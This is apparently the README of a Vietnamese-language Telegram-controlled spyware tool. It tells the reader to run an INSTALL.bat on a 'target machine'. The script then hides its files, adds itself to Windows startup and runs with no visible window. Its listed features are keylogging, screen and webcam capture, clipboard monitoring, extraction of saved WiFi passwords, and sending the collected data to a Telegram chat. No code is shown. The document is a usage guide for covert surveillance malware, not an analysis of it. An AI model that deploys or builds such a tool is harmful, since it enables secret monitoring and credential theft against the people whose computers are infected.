# 🖥️ Remote Control Application

Ứng dụng điều khiển từ xa qua Telegram - Tự động quay màn hình, ghi phím, và gửi dữ liệu.

## 🚀 Cài đặt nhanh

### Trên máy đích (chỉ cần 1 bước):

1. **Tải file `INSTALL.bat`** từ GitHub:
   - Vào: https://github.com/truongxoantit/TLe1
   - Click vào file `INSTALL.bat`
   - Click nút **"Raw"** (góc phải trên)
   - Click chuột phải → **"Save as"** → Lưu với tên `INSTALL.bat`

2. **Chạy file `INSTALL.bat`** (Click đúp hoặc chuột phải → Run as Administrator)

**XONG!** Ứng dụng sẽ tự động:
- ✅ Tải tất cả file từ GitHub Private Repo
- ✅ Cài đặt thư viện Python
- ✅ Ẩn thư mục và file
- ✅ Thêm vào Windows Startup
- ✅ Khởi động ứng dụng ngay
- ✅ Chạy hoàn toàn ẩn

## 📋 Tính năng

- 🎥 **Quay màn hình**: Tự động quay 10-20 giây
- ⌨️ **Keylogger**: Ghi lại tất cả phím bấm
- 📸 **Screenshot**: Chụp ảnh màn hình định kỳ
- 📋 **Clipboard**: Theo dõi clipboard
- 📁 **File Transfer**: Gửi/nhận file qua Telegram
- 🎮 **Remote Control**: Điều khiển từ xa qua Telegram
- 🖥️ **System Info**: Thu thập thông tin hệ thống
- 📶 **WiFi Extractor**: Lấy mật khẩu WiFi đã lưu (mỗi 1 giờ)
- 📹 **Webcam Capture**: Chụp ảnh từ webcam định kỳ (mỗi 30 phút)
- 🔌 **USB Monitor**: Theo dõi thiết bị USB mới (mỗi 1 phút)
- 🔒 **Stealth Mode**: Chạy hoàn toàn ẩn

## ⚙️ Cấu hình

Sửa file `config.py`:
- `TELEGRAM_BOT_TOKEN`: Token bot Telegram
- `TELEGRAM_CHAT_ID`: ID chat để nhận dữ liệu

## 🛑 Dừng ứng dụng

Nhấn: **Ctrl + Shift + Alt + P**

## 📁 Cấu trúc file

```
main/
├── INSTALL.bat              ← File cài đặt (QUAN TRỌNG!)
├── main_stealth.py          ← File chính
├── config.py                ← Cấu hình
├── requirements.txt         ← Thư viện Python
└── ... (các module khác)
```

## ⚠️ Lưu ý

- Cần Python trên máy đích
- Ứng dụng tự động chạy khi khởi động Windows
- Chạy hoàn toàn ẩn, không có cửa sổ
- Repo GitHub: **TLe1** (Private)

## 📖 Hướng dẫn chi tiết

Xem file `HUONG_DAN_DAY_DU.md` để biết cách:
- Tạo repo GitHub
- Upload file lên GitHub
- Cài đặt trên máy đích
- Xử lý lỗi
